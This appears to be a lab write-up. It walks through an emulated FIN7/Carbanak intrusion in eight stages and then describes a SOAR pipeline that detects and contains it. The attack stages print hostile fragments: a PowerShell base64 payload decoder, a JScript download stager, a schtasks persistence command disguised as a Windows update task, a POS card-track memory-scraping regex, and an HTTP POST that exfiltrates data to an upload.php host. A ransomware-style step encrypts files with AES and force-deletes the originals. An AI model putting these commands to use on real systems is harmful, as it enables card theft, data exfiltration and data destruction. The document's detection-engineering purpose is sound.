DETAILED 8-STAGE CHAIN ANALYSIS
1
Reconnaissance and Preparation
The adversary performs extensive reconnaissance on the target's infrastructure and point-of-sale operations. FIN7 constructs a deceptive shell corporation ('Slazzer LLC') and registers fraudulent domains to facilitate sophisticated spearphishing campaigns.
↓
2
Initial Access
Initiates targeted spearphishing emails to organizational personnel. These emails incorporate maliciously configured DOCX attachments, frequently masquerading as overdue financial invoices to manipulate user behavior.
Attachment: Payment overdue.eml, 1-list.docx
↓
3
Execution
Upon opening the document, the victim inadvertently enables macros. The BATELEUR loader is consequently executed via the wscript.exe host. A hidden PowerShell instance initiates with the -NoProfile parameter to decode the primary payload.
powershell -NoProfile -c "$b=Get-Content '%INFILE%';[IO.File]::WriteAllBytes('%OUTFILE%',[Convert]::FromBase64String($b))"
↓
4
Command & Control (C2) Communication
An HTTP GET request retrieves an encoded malware configuration (debug.txt) which is subsequently converted into JScript (debug.log). The JScript engine leverages ADODB.Stream to facilitate the download of the principal Carbanak binary (update.exe).
http.open("GET", url, false); stream.Write(http.responseBody); stream.SaveToFile(outPath, 2);
↓
5
Persistence Establishment
The threat actor registers a Scheduled Task designated 'WindowsUpdateDebug' to execute the malicious script upon user logon. Additionally, the Carbanak module utilizes sdbinst.exe to install an Application Shim database (.sdb), ensuring sophisticated evasion.
schtasks /create /f /sc onlogon /tn "WindowsUpdateDebug" /tr "wscript.exe //e:jscript debug.log"
↓
6
Data Collection
The malware inspects POS process memory using the ReadProcessMemory API to identify and extract payment card architectures (Track 1/2). Auxiliary C# modules for keylogging and screen capturing are injected directly into RAM via DNS Tunneling (TXT records).
Resolve-DnsName -Name $domain -Type TXT -Server $SLINGSHOT_IP Regex pattern = new Regex(@"%B\d{1,19}\^[A-Za-z\s/]{2,26}\^\d{4}.*\?");
↓
7
Data Exfiltration
Compiles all recorded keystrokes, captured screenshots, and extracted RAM data into a session-specific ZIP archive. The accumulated dataset is then exfiltrated via an HTTP POST request directed to the adversary's upload.php script.
$webClient = New-Object System.Net.WebClient $response = $webClient.UploadFile("http://10.10.20.10/upload.php", "POST", $zip)
↓
8
Impact & Ransomware Deployment
Implements the System.Security.Cryptography.Aes class to encrypt crucial filesystem directories utilizing the AES-CBC algorithm. Files are modified with an .aes extension, and the Remove-Item -Force cmdlet is deployed to irrevocably delete the original, unencrypted files.
$Aes = [System.Security.Cryptography.Aes]::Create() $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC Remove-Item -Path $Path -Force
◈ Automated SOAR Pipeline
Telemetry Ingestion → Automated Response · 5-Layer Processing Architecture (main.py)
Layer 1 · Ingestion
Log Collection & Aggregation
Executes concurrent polling via the Splunk CLI utilizing a ThreadPoolExecutor across three primary telemetry sources: Zeek (conn/dns/http), Suricata EVE JSON alerts, and Winlogbeat (Events 1/3/4/11/22/23/4104/4624/4625/4663/4698). Supports a DRY_RUN mode for local JSON file ingestion and implements per-source checkpointing to eliminate redundant processing.
ingestion.py · poll_all_sources()
Layer 2 · Correlation
Normalization · Deduplication · Correlation
Aggregates and chronologically sorts telemetry. Performs cross-source deduplication based on unique algorithmic keys (src_ip, dst_port, event_type, time_bucket±2s) maintaining a prioritization hierarchy (Winlogbeat > Suricata > Zeek). Implements session correlation to dynamically attribute endpoint behavioral artifacts lacking direct source IPs to the identified threat actor.
correlation.py · correlate_pipeline()
Layer 3 · Scoring & Enrichment
Zero Trust Risk Evaluation · TI Boost
Applies advanced behavioral rulesets (e.g., R1 Port Scan +20, R2 HTTP C2 +25, R6 PowerShell Bypass +40, R10 DNS Tunnel +40, R12 App Shimming +45) coupled with automated temporal score decay. Integrates Threat Intelligence (TI) enrichment via simulated VirusTotal and AbuseIPDB API lookups; exceeding predefined thresholds triggers contextual score multipliers (+50 for malicious, +20 for suspicious indicators).
scoring.py · ScoringEngine | enrichment.py · ThreatIntelEnricher
Layer 4 · Decision
Threshold Evaluation · Action Routing
Evaluates the cumulative risk score against predefined operational thresholds (e.g., IOC mode: Non-Whitelisted ≥ 50, Whitelisted ≥ 100). Automatically triggers primary countermeasures such as the BLOCK_EMAIL directive. Upon detecting critical process-level anomalies (e.g., ps_bypass, fin7_app_shimming) with a score ≥ 120, the system automatically initiates a KILL_PROCESS directive for immediate EDR containment.
decision.py · DecisionEngine.evaluate()
Layer 5 · Response
Automated Remediation Mechanisms
Executes autonomous remediation strategies: (1) Network Isolation: Transmits a POST request to the pfSense API to block the adversary's IP on the WAN interface. (2) EDR Containment: Establishes a secure SSH tunnel to the affected endpoint to suspend or terminate malicious processes and forcefully log off compromised sessions. (3) Incident Notification: Dispatches a comprehensive SMTP HTML report detailing risk metrics, TI reputation, and firewall status.
response.py · ResponseEngine.execute() | process_containment.py
